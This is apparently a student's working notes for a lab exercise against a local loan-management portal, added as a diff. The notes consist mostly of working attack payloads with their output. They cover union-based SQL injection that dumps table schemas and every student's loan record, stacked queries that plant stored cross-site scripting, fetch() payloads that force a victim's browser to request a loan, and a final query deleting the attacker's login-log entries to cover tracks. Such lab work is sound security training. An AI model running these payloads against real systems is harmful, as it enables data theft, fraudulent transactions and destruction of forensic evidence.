@@ -1,0 +1,267 @@
+B@h_Ca$h
+
+Attacker 
+
+9900001 
+meherun.nesa
+nesa-99
+
+meherun.nesa
+chat-Meherun-99
+
+Victim 
+
+9900002 
+shafayet.islam 
+islam-99 
+
+shafayet.islam 
+chat-Shafayet-99
+
+
+nesa-99' or '1'='1
+
+nesa-99' or '1'='0
+
+password field is vulnerable
+
+nesa-99' order by 1 -- -
+nesa-99' order by 2 -- -
+nesa-99' order by 3 -- -
+nesa-99' order by 4 -- -
+nesa-99' order by 5 -- -
+nesa-99' order by 6 -- -
+
+
+nesa-99' order by 6 limit 1 -- -
+nesa-99' order by 7 limit 1 -- -
+
+total column=6
+
+Loan Management Portal
+Welcome, Meherun Nesa
+
+Username: meherun.nesa
+
+Current Loan Amount: $1250.00
+Log Out
+Request New Loan
+Amount:
+Request Loan 
+
+' union select 1,2,3,4,5,6 -- -
+
+Loan Management Portal
+Welcome, 2 3
+
+Username: 4
+
+Current Loan Amount: $6.00
+Log Out
+Request New Loan
+Amount:
+Request Loan 
+
+so 2,3,4 and 6 are used
+
+
+' union select 1,'','','',5,'' -- -
+Loan Management Portal
+Welcome,
+
+Username:
+
+Current Loan Amount: $0.00
+Log Out
+Request New Loan
+Amount:
+Request Loan 
+so, 6 is numerical type data
+
+' union select 1,'','',database(),5,'' -- -
+
+a2_loan
+
+
+' union select 1,'','',group_concat(table_name),5,'' from information_schema.tables where table_schema='a2_loan' -- --- -
+
+
+2 tables -> loan,log
+
+for each one
+
+' union select 1,group_concat(column_name),'',4 from information_schema.columns where table_name='fine_record' -- -
+
+' union select 1,'','',group_concat(column_name),5,'' from information_schema.columns where table_name='loan' -- --- -
+
+student_id,first_name,last_name,username,password,loan_amount
+
+' union select 1,'','',group_concat(column_name, ':', column_type),5,'' from information_schema.columns where table_name='loan' -- --- -
+
+student_id:int,first_name:varchar(50),last_name:varchar(1000),username:varchar(100),password:varchar(100),loan_amount:decimal(10,2)
+
+' union select 1,'','',group_concat(distinct student_id),5,'' from loan -- --- -
+
+9900001,9900002,9900003,9900004,9900005,9900006,9900007,9900008,9900009,9900010,9900011,9900012,9900013,9900014,9900015
+
+
+' union select 1,'','',group_concat(column_name),5,'' from information_schema.columns where table_name='log' -- --- -
+
+id,submitted_username,submitted_password,attempted_at
+
+' union 
+select 1, group_concat(
+    member_id, ' ', first_name, ' ', last_name, ':', ifnull((
+        select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'
+    ),0), '<br>'
+), '', 4 from member m
+-- -
+
+' union select 
+    1,
+    '',
+    '',
+    group_concat(
+        student_id,
+        ' ',
+        first_name,
+        ' ',
+        last_name,
+        ' - ',
+        loan_amount,
+        '<br>'
+        ),5,'' 
+    from loan -- --- -
+
+Username: 9900001 Meherun Nesa - 1250.00
+,9900002 Shafayet Islam - 3400.50
+,9900003 Tanjila Ferdous - 0.00
+,9900004 Imran Chowdhury - 2200.75
+,9900005 Nadia Islam - 875.25
+,9900006 Rafiul Azam - 4990.00
+,9900007 Sabrina Yasmin - 0.00
+,9900008 Ashraful Alam - 1600.40
+,9900009 Priya Sarkar - 3120.00
+,9900010 Kazi Rubel - 500.00
+,9900011 Farzana Akhtar - 2750.60
+,9900012 Mohsin Reza - 4300.00
+,9900013 Tanvir Ahsan - 0.00
+,9900014 Ruksana Parvin - 1980.20
+,9900015 Ibrahim Khalil - 3675.90
+
+nesa-99'; update loan set last_name = '<i>Nesa</i>' 
+where student_id = 9900001 -- -
+
+Loan Management Portal
+Welcome, Meherun Nesa <- this Nesa got italic :>
+
+Username: meherun.nesa
+
+Current Loan Amount: $1250.00
+Log Out
+Request New Loan
+Amount:
+Request Loan 
+
+==============
+
+body	"hi, I need 100 taka"
+
+await fetch("http://localhost:7001/send", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "referrer": "http://localhost:7001/",
+    "body": "body=hi%2C+I+need+100+taka",
+    "method": "POST",
+    "mode": "cors"
+});
+
+
+await fetch("http://localhost:7001/send", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "body=hi%2C+I+need+100+taka",
+    "method": "POST",
+});
+
+--> succeed from loan portal
+
+reward link needs a sql query which 
+
+chat-Meherun-99' order by 1 limit 1 -- -
+chat-Meherun-99' order by 7 limit 1 -- -
+chat-Meherun-99' or '1'='1
+
+amount	"1000"
+
+await fetch("http://localhost:7000/request-loan", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "amount=1000",
+    "method": "POST",
+});
+
+<script>
+fetch("http://localhost:7000/request-loan", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "amount=1000",
+    "method": "POST",
+});
+</script>
+
+%3Cscript%3Efetch(%22http://localhost:7000/request-loan%22,%20%7B%22credentials%22:%20%22include%22,%22headers%22:%20%7B%22Content-Type%22:%20%22application/x-www-form-urlencoded%22,%7D,%22body%22:%20%22amount=1000%22,%22method%22:%20%22POST%22,%7D);%3C/script%3E
+
+
+nesa-99';
+update loan set last_name = 
+concat (
+    last_name,
+    '<script>
+        fetch("http://localhost:7001/send", {
+        "credentials": "include",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        "body": "body=%3Cscript%3E%20%253Cscript%253Efetch(%2522http://localhost:7000/request-loan%2522,%2520%257B%2522credentials%2522:%2520%2522include%2522,%2522headers%2522:%2520%257B%2522Content-Type%2522:%2520%2522application/x-www-form-urlencoded%2522,%257D,%2522body%2522:%2520%2522amount=1000%2522,%2522method%2522:%2520%2522POST%2522,%257D);%253C/script%253E%20%3C/script%3E",
+        "method": "POST",
+    });
+    </script>'
+) where student_id = 9900001; -- -
+
+<script> %3Cscript%3Efetch(%22http://localhost:7000/request-loan%22,%20%7B%22credentials%22:%20%22include%22,%22headers%22:%20%7B%22Content-Type%22:%20%22application/x-www-form-urlencoded%22,%7D,%22body%22:%20%22amount=1000%22,%22method%22:%20%22POST%22,%7D);%3C/script%3E </script>
+
+%3Cscript%3E%20%253Cscript%253Efetch(%2522http://localhost:7000/request-loan%2522,%2520%257B%2522credentials%2522:%2520%2522include%2522,%2522headers%2522:%2520%257B%2522Content-Type%2522:%2520%2522application/x-www-form-urlencoded%2522,%257D,%2522body%2522:%2520%2522amount=1000%2522,%2522method%2522:%2520%2522POST%2522,%257D);%253C/script%253E%20%3C/script%3E
+
+<script>HTMLElement('%3Cscript%3Efetch(%22http://localhost:7000/request-loan%22,%20%7B%22credentials%22:%20%22include%22,%22headers%22:%20%7B%22Content-Type%22:%20%22application/x-www-form-urlencoded%22,%7D,%22body%22:%20%22amount=1000%22,%22method%22:%20%22POST%22,%7D);%3C/script%3E')</script>
+
+
+
+
+
+encodeURI('<script>fetch("http://localhost:7000/request-loan", {"credentials": "include","headers": {"Content-Type": "application/x-www-form-urlencoded",},"body": "amount=1000","method": "POST",});</script>')
+
+
+================
+Bonus - cover your tracks (+1): Discover the forensic trail left by Loan Portal login submis-
+sions and, through the same injection channel, delete only the trail attributable to the attacker
+account. Evidence belonging to every other student must remain intact.
+
+nesa-99'; DELETE FROM log WHERE id = 9900001; -- -
